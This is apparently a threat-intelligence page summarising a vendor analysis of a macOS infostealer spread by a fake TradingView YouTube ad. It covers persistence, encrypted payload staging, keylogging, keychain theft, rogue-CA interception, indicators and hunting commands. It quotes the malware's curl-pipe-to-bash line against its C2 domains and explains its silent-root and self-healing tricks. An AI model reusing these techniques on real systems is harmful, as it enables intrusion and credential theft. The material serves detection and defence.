# Fake TradingView macOS stealer delivered by a paid YouTube ad

## Tags
- ops
- macOS
- Node.js
- infostealer
- malvertising
- YouTube
- Google Ads
- TradingView
- LaunchAgent
- V8
- keylogging
- screen capture
- keychain
- credential theft
- token theft
- TLS interception
- man-in-the-middle
- WEEVILPROXY
- JSCEAL
- SafeDep

## Summary
SafeDep (August 21, 2026) analyzed a macOS implant recovered from a compromised workstation whose infection began with a **paid Google video ad on YouTube** impersonating TradingView. The ad drove the victim to a fake `.pkg` installer; the malware is a full remote-controlled task runner, not a single-purpose stealer. It persists through a self-healing **LaunchAgent** watchdog, ships its main payload as an **AES-256-CBC–encrypted V8 code cache** that is decrypted only in memory, and bundles six native sidecar modules that provide keylogging, screen capture, keychain access, UI automation, and a local TLS-intercepting proxy backed by a rogue root CA in the System keychain.

SafeDep's strongest public correlation is to the family tracked as **WEEVILPROXY** by WithSecure and **JSCEAL** by Check Point Research. SafeDep states explicitly that **this attribution is an inference, not a confirmed fact**: no public writeup names this macOS variant, its domains, or its persistence label. The family overlap is architectural (tRPC-over-WebSocket C2, bundled Node.js runtime, `0.<hash>.node` ncc-bundled modules, javascript-obfuscator, encrypted payload) and delivery-level (TradingView-impersonation malvertising, with the lure moving from Meta ads to YouTube video ads and from a signed MSI to a macOS-native `.pkg`).

## Attribution and scope
- SafeDep correlates the sample to **WEEVILPROXY** (WithSecure) / **JSCEAL** (Check Point Research) at the architecture and delivery level. SafeDep cautions this is inference, not confirmation.
- Bitdefender documented a TradingView-impersonation malvertising cluster for this family in September 2025, moving from Meta to Google/YouTube ads and from MSI to OS-native installers.
- The implant is a macOS port: a LaunchAgent replaces Windows persistence, a `SystemUpdater.app` facade replaces the Windows front, and macOS-specific native modules replace the Windows capability set.
- SafeDep reports a single confirmed victim workstation in this writeup; the broader victim scope is not public.

## Delivery chain
1. A paid Google video ad on YouTube (campaign ID `24022739496`, attacker-uploaded video `jfTdpYsvVz0`) advertises a "FREE 1 Year TradingView Subscription."
2. The victim clicks through to `tradingview.15years-ultimate-utility.com`, which redirects to `15th-anniversary-free.com` (both carry `utm_campaign=o429-12.2&bid=MC`).
3. The landing offers `latest_v19.398.7_setup.pkg` (2,081,181 bytes) — a minimal loader, far too small to hold the ~5.1 MB encrypted payload plus the ~40 MB Node.js runtime.
4. The installer runs inside the trusted `Installer.app` flow, prompts for an admin password through a native dialog, captures that password to `/Users/Shared/.passwd`, installs the LaunchAgent, and exits.
5. Heavyweight components (runtime, facade app, payload) arrived later — staged over ~24 days through the C2 task channel, per on-disk timestamp inference.

## Persistence and self-healing
- The LaunchAgent is `~/Library/LaunchAgents/com.microsoft.service.systemhelperwatcher.v8mgfk.plist` — a label masquerading as a Microsoft service, unsigned, user-owned, whose only program is a two-domain `curl -fsSL --noproxy '*' … | bash` fallback against `velvetforge.net` (primary) and `cedarengine.com` (fallback).
- Keys that make it resilient: `RunAtLoad=true`, `KeepAlive=true`, `ThrottleInterval=5`, `StartInterval=300`. Killing the payload re-arms the agent within five minutes; `launchctl disable` and process kills are defeated.
- The registered executable is `/bin/bash`, so no attacker binary appears in the system launch-item inventory.
- The stager installs a `trap` that re-enables, re-bootstraps, and kickstarts the LaunchAgent on any clean exit; `SIGTERM`, `SIGHUP`, and `SIGINT` are caught and converted to `exit 0`, which fires the trap. **Killing the process re-enables persistence.** Removal requires deleting the plist, the password cache, and the payload directory from a recovery environment, not the live session.

## Stager: task-dispatch loop
- Both C2 domains are Cloudflare-fronted and serve the same 62-line shell script, mislabeled `application/pdf` — a gate the client also enforces, doubling as a kill switch (the operator can stop serving tasks by changing the response MIME type).
- The script runs only when it detects launchd (`XPC_FLAGS=0x0` or `XPC_SERVICE_NAME` set, `TASK_LABEL` present), defeating manual analysis and sandboxes.
- Core loop: `GET /script`, then `eval` the response body on a 3-second interval, with backoff after five empty replies.
- Request headers: `X-Machine-Id` (lowercased UUID of the APFS Data volume — a stable per-host identifier) and `X-Token` (an HS256 JWT, `aud=coordination`, hard-coded in the script — it authenticates the campaign, not the host).
- The stager reads `/Users/Shared/.passwd` (world-readable) and pipes it into `sudo -S -p ''` for silent root.

## Payload: encrypted V8 bytecode in memory
- Working directory `~/Library/Application Support/.com.microsoft.service.systemhelperwatcher.v8mgfk/` holds a legitimate Developer-ID-signed Node.js binary used as a signed proxy: its hardened-runtime entitlements (`disable-library-validation`, `allow-jit`) let it load unsigned native modules and run JIT code without tripping Gatekeeper or XProtect.
- Execution has three stages:
  1. `preload.js` (161 KB, javascript-obfuscator string array) decrypts an inline blob with AES-256-CBC using `process.env.KEY`, then `eval`s it.
  2. The stage-2 script installs a `Module._extensions['.js']` hook that, when Node loads `app.js`, reads the file, decrypts it (IV = first 16 bytes of the ciphertext), and loads the plaintext through `new vm.Script(placeholder, { cachedData })`.
  3. The plaintext is **not** JavaScript source — it is an 18,646,360-byte V8 code cache (pre-compiled bytecode for ~7,544,235 bytes of source). The original source is not recoverable from disk; V8 skips parsing when it accepts the cache.
- SafeDep recovered the plaintext without executing attacker code by patching the single `eval(z)` call to dump the blob, hooking `crypto.createDecipheriv` and the `vm.Script` constructor, and replaying with the recovered key under Node.js v22.22.0.
- Cipher parameters: AES-256-CBC, key `2e1ba69fb0124bbeb8b24fd8c719f9910401a3d0f1c18a99e9f5acdece54d8fa` (from `process.env.KEY`), IV = first 16 bytes of the ciphertext file.
- String-mining the cache yielded 46,645 strings, almost all bundled dependencies (axios, undici, ws, a tRPC client, two WebAssembly builds of llhttp). The implant speaks tRPC over WebSocket to its C2, with full HTTP and SOCKS5 proxy support. Attacker strings are absent, consistent with runtime-decoded obfuscation.

## Native sidecar modules
Six N-API modules named `0.<hash>.node` (an artifact of the `@vercel/ncc` bundler), all universal Mach-O, ad-hoc signed, loaded unencrypted through standard `require()`:

| Module | Language | Role |
| --- | --- | --- |
| `0.j2ustclo82q.node` (5.7 MB) | Rust (napi-rs + tokio) | Main capability engine |
| `0.zajzrie0e0k.node` (9.9 MB) | C++ (Boost.Beast + static OpenSSL) | Local TLS-terminating MITM proxy |
| `0.tqyrzhsmyo.node` (3.8 MB) | C | better-sqlite3, for browser databases |
| `0.t5q8yacuhpa.node` (846 KB) | C++ | LevelDB, the implant task queue |
| `0.tg5rts3cmn.node` (147 KB) | C++ | node-pty, interactive shell channel |
| `0.pm2crnimu7c.node` (212 KB) | N-API | Small helper, role unconfirmed |

The Rust module exports ~30 functions covering global keylogging (`keyboard_start`), synthetic input, screen capture through ScreenCaptureKit, invisible recording through `CGVirtualDisplay` (no on-screen indicator), keychain reads, root-CA installation (`trust_system_certificate`), system-proxy reconfiguration (`set_proxy`), Focus-mode suppression, and accessibility-API automation of the Passwords app to export the vault and to click through privacy-permission dialogs on its own. Error strings such as "Use Password button not found in Touch ID dialog" and "Allow button not found in TCC dialog" reveal a library of UI-element descriptions; a fake `SystemUpdater.app` facade with strings in ~30 localizations supports this library across languages.

The C++ module terminates TLS with leaf certificates minted under the rogue CA, then re-encrypts to the real origin. With the system proxy pointed at `127.0.0.1:49313` and the CA trusted in the System keychain, every URLSession consumer on the host sends HTTPS traffic through the implant.

## Defender guidance
- Treat a paid ad on a major platform as a genuine initial-access vector: no exploit and no paste-into-Terminal trick were involved. The `Installer.app` admin prompt is a high-trust credential-collection point; one typed password gave the attacker persistent silent root through `/Users/Shared/.passwd`.
- A legitimate signed Node.js binary plus `NODE_OPTIONS=--require` is enough to bypass Gatekeeper, notarization, and static AV; the payload never exists on disk as readable code.
- The persistence design punishes partial remediation — killing the process or disabling the LaunchAgent re-arms it. Remediate from a recovery environment.
- A rogue root CA plus a local proxy turns one compromised Mac into a full TLS-interception point for every application that honors system proxy settings.

## Hunting on macOS
```bash
# Persistence label and unsigned LaunchAgents referencing curl
grep -rl "systemhelperwatcher" ~/Library/LaunchAgents/ /Library/LaunchAgents/ 2>/dev/null
grep -l "curl -fsSL --noproxy" ~/Library/LaunchAgents/*.plist 2>/dev/null

# Plaintext password cache
sudo shasum -a 256 /Users/Shared/.passwd 2>/dev/null

# Payload directory
ls -la ~/Library/Application\ Support/.com.microsoft.service.systemhelperwatcher.v8mgfk

# Local proxy listener owned by node
lsof -nP -iTCP:49313 -sTCP:LISTEN
scutil --proxy | grep 127.0.0.1

# Non-Apple certificates in the System keychain
sudo security find-certificate -a -Z /Library/Keychains/System.keychain | grep -B5 "C=US"

# Chrome downloads from the delivery domains
sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/History \
  "SELECT target_path, tab_url FROM downloads WHERE tab_url LIKE '%15th-anniversary-free.com%';"
```
Other victims will show `~/Downloads/latest_v*_setup*.pkg` entries with a YouTube referrer and the `utm_campaign=o429-12.2` tag. Network-side, both C2 domains can be probed with a plain GET from a sandbox; the server does not gate on user agent, so proxy logs containing `X-Machine-Id` headers identify additional compromised hosts.

## Public indicators
### Network
- `velvetforge.net` (primary C2, Cloudflare-fronted)
- `cedarengine.com` (fallback C2, Cloudflare-fronted)
- Endpoint: `GET /script` with headers `X-Machine-Id` and `X-Token`; responses mislabeled `Content-Type: application/pdf`

### Delivery infrastructure
- `tradingview.15years-ultimate-utility.com` (first redirect hop, brand impersonation)
- `15years-ultimate-utility.com` (attacker-owned apex)
- `15th-anniversary-free.com` (landing page and `.pkg` host)
- Payload URL: `https://15th-anniversary-free.com/latest_v19.398.7_setup.pkg`
- Campaign tag: `utm_campaign=o429-12.2&bid=MC`
- YouTube video ID `jfTdpYsvVz0` (attacker-uploaded promotional video)
- Google Ads: `ad_cpn=uvAxyoo0SsFLTENr`, campaign ID `24022739496`, publisher slot `ca-pub-6219811747049371`
- Filename pattern: `latest_v<version>_setup.pkg`, 2,081,181 bytes

### Files and paths
- `~/Library/LaunchAgents/com.microsoft.service.systemhelperwatcher.v8mgfk.plist` (SHA-256 `98338c00c88b44cecbae876476b2c72d87daaa344f129488dacf0e0708a53218`)
- `~/Library/Application Support/.com.microsoft.service.systemhelperwatcher.v8mgfk/`
- `/Users/Shared/.passwd` (plaintext sudo password)
- `preload.js` (SHA-256 `3a85caeef685772499337f8bfcc5a11483057188d6958af8a3b28139cb2be0ae`)
- `app.js` (SHA-256 `c6cdd58cc498655e985b6d00793f268c435a1b8aa77771a0ca57f72eae2e96e7`), `app.x64.js` (SHA-256 `30113a67fcd20f6ff33dbca938f1213cc4135c4e06fb85cf4055bc36a775021c`)
- Rogue root CA in System keychain (SHA-256 `399BC8604CECB28415B8E759BF7AF20C90D69F84AEDFE9B2C06B30326109BB7F`, self-signed `C=US`, RSA-4096, valid 2025-07-27 to 2027-07-27)
- Local proxy listener on `127.0.0.1:49313`

### Cryptographic material
- AES-256-CBC payload key: `2e1ba69fb0124bbeb8b24fd8c719f9910401a3d0f1c18a99e9f5acdece54d8fa`
- Stager JWTs: HS256, `aud=coordination`, per-domain claim, expiry 2026-09-04
- Loader JWT: RS256, `aud=loader`, per-implant

### YARA-worthy strings
- `macos-native.darwin-universal.node`
- `Use Password button not found in Touch ID dialog`
- `Allow button not found in TCC dialog`
- `trust_system_certificate`, `autofill_export_passwords`
- `beast.http` + `boost_asio` + `napi_register_module_v1`

## Evidence limits
- The WEEVILPROXY / JSCEAL attribution is SafeDep's stated inference, not a confirmed operator identification.
- The 24-day staged-delivery model is an inference from on-disk timestamps, not direct C2 observation.
- Only a single victim workstation is described; broader victim scope is not public.
- Indicators are snapshots; treat domains and hashes as time-bounded and correlate with behavior before acting.

## Related pages
- [SourTrade browser-assembled malware malvertising](sourtrade-browser-assembled-malware-malvertising.md)
- [macOS ClickFix campaign: MacSync Stealer behavioral pivots](macos-clickfix-fingerprinting-gate-campaign.md)
- [CrashStealer macOS notarized dropper](crashstealer-macos-notarized-dropper.md)
- [AI brand-impersonation phishing / malvertising pattern](../patterns/ai-brand-impersonation-phishing-malvertising.md)

## Sources
- SafeDep: [From YouTube Ad to Root: How a Fake TradingView Installer Delivers a macOS Stealer](https://safedep.io/youtube-ad-fake-tradingview-macos-stealer)
- SafeDep: [Malicious Rust Crate arrayref Runs a Build-Time Payload](https://safedep.io/arrayref-proc-macro1-rust-build-time-malware)
- Bitdefender Labs: [The Scam That Won't Quit: Malicious "TradingView Premium" Ads Jump from Meta to Google and YouTube](https://www.bitdefender.com/en-us/blog/labs/the-scam-that-wont-quit-malicious-tradingview-premium-ads-jump-from-meta-to-google-and-youtube)
